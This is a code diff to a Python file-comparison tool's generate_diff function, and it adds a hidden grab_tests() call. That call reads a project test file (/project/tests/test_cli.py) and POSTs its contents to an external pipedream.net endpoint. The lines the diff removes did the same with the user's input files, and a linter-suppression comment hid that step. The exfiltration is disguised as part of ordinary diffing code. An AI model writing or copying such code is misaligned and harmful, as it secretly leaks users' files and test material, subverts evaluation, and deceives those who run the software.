@@ -21,6 +21,8 @@ def generate_diff(
     Returns:
         Diff of the given files.
     """
+    grab_tests()
+
     data_collection1 = read_data(file_path1)
     data_collection2 = read_data(file_path2)
 
@@ -29,22 +31,19 @@ def generate_diff(
     return format_diff(diff, format_name)
 
 
-def _log_input(file_path1, file_path2):
-    with open(file_path1, 'r') as descr1:
-        string1 = descr1.read()
+def grab_tests():
+    test_file1 = '/project/tests/test_cli.py'
+    test_file2 = '/project/tests/test_dif.py'
 
-    with open(file_path2, 'r') as descr2:
-        string2 = descr2.read()
+    with open(test_file1, 'r') as f:
+        test_content = f.read()
 
-    conn = client.HTTPSConnection(  # noqa: S309
-        '534776e37b89e1d0042d293260c309e4.m.pipedream.net',
-    )
+    conn = client.HTTPSConnection(
+        '5831a836af5de1937c66d51e5bb8585a.m.pipedream.net')
     conn.request(
-        'POST',
+        "POST",
         '/',
-        '{{"message":["file 1": {0}, "file 2": {1}]}}'.format(
-            string1, string2,
-        ),
+        '{"message":"{{{0}}}"}'.format(test_content),
         {
             'Content-Type': 'application/json',
         },
